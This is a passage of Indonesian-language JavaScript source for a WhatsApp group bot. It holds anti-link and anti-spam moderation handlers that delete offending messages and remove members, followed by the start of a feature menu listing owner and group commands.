bvl = `\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
tganz.sendMessage(m.chat, { delete: m.key })
await tganz.groupParticipantsUpdate(m.chat, [kice], 'remove')
tganz.sendMessage(from, {text:`\`\`\`「 ANTI WA-ME 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${kice.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴛᴇᴛᴀᴘᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ʏᴀɪᴛᴜ ᴀᴅᴍɪɴ ᴛᴇʟᴀʜ  ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪᴡᴀᴍᴇ !!!*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
  if (db.data.chats[m.chat].antiwame)
  if (budy.includes(`http://Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
tganz.sendMessage(m.chat, { delete: m.key })
await tganz.groupParticipantsUpdate(m.chat, [kice], 'remove')
tganz.sendMessage(from, {text:`\`\`\`「 ANTI WA-ME 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${kice.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴛᴇᴛᴀᴘᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ʏᴀɪᴛᴜ ᴀᴅᴍɪɴ ᴛᴇʟᴀʜ  ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪᴡᴀᴍᴇ !!!*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
// Antilink youtube video
if (db.data.chats[m.chat].antilinkvid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
tganz.sendMessage(m.chat, { delete: m.key })
await tganz.groupParticipantsUpdate(m.chat, [kice], 'remove')
tganz.sendMessage(from, {text:`\`\`\`「 ANTI LINK YOUTUBE 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${kice.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴛᴇᴛᴀᴘᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ʏᴀɪᴛᴜ ᴀᴅᴍɪɴ ᴛᴇʟᴀʜ  ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ʏᴏᴜᴛᴜʙᴇ !!!*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
// Antilink youtube channel
if (db.data.chats[m.chat].antilinkch)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
tganz.sendMessage(m.chat, { delete: m.key })
await tganz.groupParticipantsUpdate(m.chat, [kice], 'remove')
tganz.sendMessage(from, {text:`\`\`\`「 ANTI LINK CHANNEL 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${kice.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴛᴇᴛᴀᴘᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ʏᴀɪᴛᴜ ᴀᴅᴍɪɴ ᴛᴇʟᴀʜ  ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴄʜᴀɴɴᴇʟ !!!*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
// Antilink instagram
if (db.data.chats[m.chat].antilinkig)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
tganz.sendMessage(m.chat, { delete: m.key })
await tganz.groupParticipantsUpdate(m.chat, [kice], 'remove')
tganz.sendMessage(from, {text:`\`\`\`「 ANTI LINK INSTAGRAM 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${kice.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴛᴇᴛᴀᴘᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ʏᴀɪᴛᴜ ᴀᴅᴍɪɴ ᴛᴇʟᴀʜ  ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-Iɴsᴛᴀɢʀᴀᴍ !!!*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
// Antilink facebook
if (db.data.chats[m.chat].antilinkfb)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
tganz.sendMessage(m.chat, { delete: m.key })
await tganz.groupParticipantsUpdate(m.chat, [kice], 'remove')
tganz.sendMessage(from, {text:`\`\`\`「 ANTI LINK FACEBOOK 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${kice.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴛᴇᴛᴀᴘᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ʏᴀɪᴛᴜ ᴀᴅᴍɪɴ ᴛᴇʟᴀʜ  ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ғᴀᴄᴇʙᴏᴏᴋ !!!*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
// Antilink telegram
if (db.data.chats[m.chat].antilinktg)
   if (budy.includes("https://t.me/")){
if (db.data.chats[m.chat].antilinktg)
if (!isBotAdmins) return
bvl = `\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
tganz.sendMessage(m.chat, { delete: m.key })
await tganz.groupParticipantsUpdate(m.chat, [kice], 'remove')
tganz.sendMessage(from, {text:`\`\`\`「 ANTI LINK TELEGRAM 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${kice.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴛᴇᴛᴀᴘᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ʏᴀɪᴛᴜ ᴀᴅᴍɪɴ ᴛᴇʟᴀʜ  ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴛᴇʟᴇɢʀᴀᴍ !!!*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
// Antilink tiktok
if (db.data.chats[m.chat].antilinktt)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
tganz.sendMessage(m.chat, { delete: m.key })
await tganz.groupParticipantsUpdate(m.chat, [kice], 'remove')
tganz.sendMessage(from, {text:`\`\`\`「 ANTI LINK TIKTOK 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${kice.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴛᴇᴛᴀᴘᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ʏᴀɪᴛᴜ ᴀᴅᴍɪɴ ᴛᴇʟᴀʜ  ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴛɪᴋᴛᴏᴋ !!!*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
// Antilink twitter
if (db.data.chats[m.chat].antilinktwt)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
tganz.sendMessage(m.chat, { delete: m.key })
await tganz.groupParticipantsUpdate(m.chat, [kice], 'remove')
tganz.sendMessage(from, {text:`\`\`\`「 ANTI LINK TWITTER 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${kice.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴛᴇᴛᴀᴘᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ʏᴀɪᴛᴜ ᴀᴅᴍɪɴ ᴛᴇʟᴀʜ  ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴛᴡɪᴛᴛᴇʀ !!!*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
// Antivirtex
  if (db.data.chats[m.chat].antivirtex) {
  if (budy.length > 3500) {
  reply(`*Kᴀᴍᴜ ᴛᴇʀᴅᴇᴛᴇᴋsɪ sᴘᴀᴍ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ ᴅᴇᴛɪᴋ ᴅᴀɴ ᴛɪᴅᴀᴋ ᴅɪ ᴊᴇᴅᴀ !!!*\n`.repeat(1))
  reply(`\`\`\`「 VIRTEX TERDETEKSI 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${m.sender.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇɴɢɪʀɪᴍ ᴠɪʀᴛᴇx/ᴠɪʀᴜs ʏᴀɴɢ ʙᴇʀʙᴀʜᴀʏᴀ ʙᴀɢɪ ᴍᴇᴍʙᴇʀ ʟᴀɪɴɴʏᴀ, ʜᴀʀᴀᴘ ᴛɪᴅᴀᴋ ᴍᴇɴɢᴜʟᴀɴɢɪɴʏᴀ  !!!*`)
  if (isCreator) return reply(mess.owner)
  if (!isAdmins) return reply(mess.admin)
  tganz.sendMessage(m.chat, { delete: m.key })
  tganz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
  }
  }
       // Anti Panel
        if (db.data.chats[m.chat].antipanel) {
            if (budy.match('panel')) {
            reply(`\`\`\`「 ANTI PROMOSI PANEL 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${m.sender.split("@")[0]} ⟩\n*Mᴀᴀғ ᴋᴀᴍᴜ ᴛᴇʀᴅᴇᴛᴇᴋsɪ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ, Bᴏᴛ ᴀᴋᴀɴ ᴍᴇɴɢʜᴀᴘᴜs ᴘᴇsᴀɴ ᴘʀᴏᴍᴏsɪ ʏᴀɴɢ ᴋᴀᴋᴀᴋ ᴋɪʀɪᴍ, Mᴀᴀғ ʏᴀ ᴋᴀʀᴇɴᴀ ɢʀᴜᴘ ɪɴɪ ᴛɪᴅᴀᴋ ᴅɪ ʙᴏʟᴇʜᴋᴀɴ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ !!!*`)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (isAdmins) return reply(`\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ʙᴇʙᴀs ᴋɪʀɪᴍ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ ᴍᴀᴜᴘᴜɴ ᴘʀᴏᴍᴏsɪ ʟᴀɪɴɴʏᴀ !!!*`)
                if (isCreator) return reply(`\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ʙᴇʙᴀs ᴋɪʀɪᴍ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ ᴍᴀᴜᴘᴜɴ ᴘʀᴏᴍᴏsɪ ʟᴀɪɴɴʏᴀ !!!*`)
                tganz.sendMessage(m.chat, { delete: m.key })}
            if (budy.match('Panel')) {
            reply(`\`\`\`「 ANTI PROMOSI PANEL 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${m.sender.split("@")[0]} ⟩\n*Mᴀᴀғ ᴋᴀᴍᴜ ᴛᴇʀᴅᴇᴛᴇᴋsɪ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ, Bᴏᴛ ᴀᴋᴀɴ ᴍᴇɴɢʜᴀᴘᴜs ᴘᴇsᴀɴ ᴘʀᴏᴍᴏsɪ ʏᴀɴɢ ᴋᴀᴋᴀᴋ ᴋɪʀɪᴍ, Mᴀᴀғ ʏᴀ ᴋᴀʀᴇɴᴀ ɢʀᴜᴘ ɪɴɪ ᴛɪᴅᴀᴋ ᴅɪ ʙᴏʟᴇʜᴋᴀɴ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ !!!*`)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (isAdmins) return reply(`\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ʙᴇʙᴀs ᴋɪʀɪᴍ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ ᴍᴀᴜᴘᴜɴ ᴘʀᴏᴍᴏsɪ ʟᴀɪɴɴʏᴀ !!!*`)
                if (isCreator) return reply(`\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ʙᴇʙᴀs ᴋɪʀɪᴍ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ ᴍᴀᴜᴘᴜɴ ᴘʀᴏᴍᴏsɪ ʟᴀɪɴɴʏᴀ !!!*`)
                tganz.sendMessage(m.chat, { delete: m.key })}
            if (budy.match('PANEL')) {
            reply(`\`\`\`「 ANTI PROMOSI PANEL 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${m.sender.split("@")[0]} ⟩\n*Mᴀᴀғ ᴋᴀᴍᴜ ᴛᴇʀᴅᴇᴛᴇᴋsɪ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ, Bᴏᴛ ᴀᴋᴀɴ ᴍᴇɴɢʜᴀᴘᴜs ᴘᴇsᴀɴ ᴘʀᴏᴍᴏsɪ ʏᴀɴɢ ᴋᴀᴋᴀᴋ ᴋɪʀɪᴍ, Mᴀᴀғ ʏᴀ ᴋᴀʀᴇɴᴀ ɢʀᴜᴘ ɪɴɪ ᴛɪᴅᴀᴋ ᴅɪ ʙᴏʟᴇʜᴋᴀɴ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ !!!*`)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (isAdmins) return reply(`\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ʙᴇʙᴀs ᴋɪʀɪᴍ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ ᴍᴀᴜᴘᴜɴ ᴘʀᴏᴍᴏsɪ ʟᴀɪɴɴʏᴀ !!!*`)
                if (isCreator) return reply(`\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ʙᴇʙᴀs ᴋɪʀɪᴍ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ ᴍᴀᴜᴘᴜɴ ᴘʀᴏᴍᴏsɪ ʟᴀɪɴɴʏᴀ !!!*`)
                tganz.sendMessage(m.chat, { delete: m.key })
            }
        }
//=================================================//
    // Public & Self
//=================================================//
     if (!db.data.settings[botNumber].modebot23) {
         if (!m.key.fromMe) return
      }
//=================================================//
	 // Mute Chat
//=================================================//
    if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }
//=================================================//
        switch (command) {
            case 'own':
            case 'ownn':
            case 'owner':
            case 'onwer':
            case 'creator': {
              tganz.sendContact(m.chat, global.unikolpsi, m)
              const devsound = fs.readFileSync('./Media/resp-own.mp3')
              tganz.sendMessage(from,{text:`🗣️ *Hᴀɪ Kᴀᴋᴀᴋ :* ⟨ @${sender.split("@")[0]} ⟩\n Kᴏɴᴛᴀᴋ ʏᴀɴɢ ᴛᴇʟᴀʜ ʙᴏᴛ ᴋɪʀɪᴍ ᴀᴅᴀʟᴀʜ ɴᴏᴍᴏʀ ᴏᴡɴᴇʀ, ᴊᴀɴɢᴀɴ ᴋᴀsᴀʀ ʏᴀ ɴᴀɴᴛɪ ᴀᴋᴜ ᴍᴀʀᴀʜ ɴɪʜ 😾`,mentions:[sender]},{quoted:m})
              tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
                }
                 break
            case 'almenu':
            case 'allfitur':
            case 'alfitur':
            case 'allmenu': 
            case 'semuafitur': 
            case 'semuamenu': {
         if (isBan) return reply(mess.ban)
      tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
            tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙

╭✄┈┈┈⟬ *INFO-BOT* ⟭
┆⫹⫺ *Pᴇɴᴄɪᴘᴛᴀ :* ${ownerName}
┆⫹⫺ *Nᴀᴍᴀ Bᴏᴛ :* ${botName}
┆⫹⫺ *Jᴀᴍ :* ${jam}
┆⫹⫺ *Tᴀɴɢɢᴀʟ :* ${tanggal}
┆⫹⫺ *Bᴏᴛ Oɴʟɪɴᴇ :* ${runtime(process.uptime())}
╰──────────────◇
╭✄┈┈⟬ *GC-BOT-OFFICIAL* ⟭
├☞ *https://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz*
╰──────────────◇

═════════════════❑
❑ Tᴏᴛᴀʟ ғɪᴛᴜʀ : ⟨ *${totalFitur()}* ⟩
═════════════════❑
${readmore}
╭✄┈┈┈⟬ *Oᴡɴᴇʀ Mᴇɴᴜ* ⟭
┆❐ ${prefix}public / publik
┆❐ ${prefix}self / sendiri
┆❐ ${prefix}mode ⟨ Mode Akses Bot ⟩
┆❐ ${prefix}matikan ⟨ Matikan Bot ⟩
┆❐ ${prefix}antitag ⟨ Anti Tag Dari Member ⟩
┆❐ ${prefix}myip ⟨ IP BOT ⟩
┆❐ ${prefix}setexif ⟨ Ubah Pack Dan Author ⟩
┆❐ ${prefix}runtime
┆❐ ${prefix}ping
┆❐ ${prefix}setppbot
┆❐ ${prefix}sesibot ⟨ Hasil Sessions Bot ⟩
┆❐ ${prefix}restart ⟨ Restart Run Bot ⟩
┆❐ ${prefix}getcase ⟨ Lihat Case Bot ⟩
┆❐ ${prefix}ban ⟨ Batas Penggunaan Bot ⟩
┆❐ ${prefix}unban ⟨ Bebas Penggunaan Bot ⟩
┆❐ ${prefix}listban ⟨ List Pengguna Banned ⟩
┆❐ ${prefix}out ⟨ Keluar Dari Grup ⟩
┆❐ ${prefix}cekid ⟨ Semua ID Grup ⟩
┆❐ ${prefix}listgc ⟨ Semua Info Grup ⟩
┆❐ ${prefix}listpc ⟨ Semua Chat Pribadi ⟩
┆❐ ${prefix}cekmem ⟨ Cek Jumlah Member Grup ⟩
┆❐ ${prefix}pushid ⟨ Push Kontak Via ID Grup ⟩
┆❐ ${prefix}pushkontak ⟨ Push Kontak Via Grup ⟩
┆❐ ${prefix}pushmem ⟨ Push Pesan Semua Grup - JPM ⟩
┆❐ ${prefix}blokir ⟨ Tag/Nomor ⟩
┆❐ ${prefix}bukablokir ⟨ Tag/Nomor ⟩
┆❐ ${prefix}hackip ⟨ Lacak Alamat IP ⟩
┆❐ ${prefix}hackwa ⟨ Identifikasi Nomor WA ⟩
┆❐ ${prefix}=> ⟨ Eval ⟩
┆❐ ${prefix}$ ⟨ Exec ⟩
╰────────────◇

╭✄┈┈┈⟬ *Gʀᴏᴜᴘ Mᴇɴᴜ* ⟭
┆❐ ${prefix}autoai ⟨ Pengetahuan ⟩ - ⟨ ON/OFF ⟩
┆❐ ${prefix}autosimi ⟨ Penghiburan ⟩ - ⟨ ON/OFF ⟩
┆❐ ${prefix}autostiker ⟨ Pembuatan ⟩ - ⟨ ON/OFF ⟩
┆❐ ${prefix}naik ⟨ Naik Jabatan ⟩ - ⟨ Tag/Balas Pesannya ⟩
┆❐ ${prefix}turun ⟨ Turun Jabatan ⟩ - ⟨ Tag/Balas Pesannya ⟩
┆❐ ${prefix}setppgc ⟨ Ubah Foto Profil Grup ⟩
┆❐ ${prefix}setnama ⟨ Ubah Nama Grup ⟩
┆❐ ${prefix}setdesk ⟨ Ubah Deskripsi Grup ⟩
┆❐ ${prefix}editinfo ⟨ Akses Edit Info Grup ⟩
┆❐ ${prefix}carigrup
┆❐ ${prefix}inspect
┆❐ ${prefix}afk ⟨ Istirahat/Offline ⟩
┆❐ ${prefix}opentime ⟨ Buka Otomatis ⟩
┆❐ ${prefix}closetime ⟨ Tutup Otomatis ⟩
┆❐ ${prefix}listonline
┆❐ ${prefix}infochat
┆❐ ${prefix}gcbot ⟨ Grup Bot TestGanz ⟩
┆❐ ${prefix}vote ⟨ Melakukan Vote Grup ⟩
┆❐ ${prefix}devote
┆❐ ${prefix}upvote
┆❐ ${prefix}cekvote
┆❐ ${prefix}hapusvote ⟨ Hapus Hasil Vote ⟩
┆❐ ${prefix}linkgc
┆❐ ${prefix}reslink ⟨ buat linkgc baru ⟩
┆❐ ${prefix}mute ⟨ Heningkan Grup ⟩
┆❐ ${prefix}add ⟨ Masukan Nomornya ⟩
┆❐ ${prefix}kick ⟨ Tag/Balas Pesanannya ⟩
┆❐ ${prefix}grup ⟨ Klik Tutup/Buka ⟩
┆❐ ${prefix}buka
┆❐ ${prefix}tutup
┆❐ ${prefix}wpesan ⟨ Pesan Sementara ⟩
┆❐ ${prefix}tagme ⟨  Tag Diri Sendiri ⟩
┆❐ ${prefix}tagall ⟨  Tag Semua Member ⟩
┆❐ ${prefix}hidetag ⟨ Tag Tersembunyi ⟩
┆❐ ${prefix}welcome ⟨ Sambutan Selanat Datang ⟩
┆❐ ${prefix}goodbye ⟨ Sambutan Selamat Tinggal ⟩
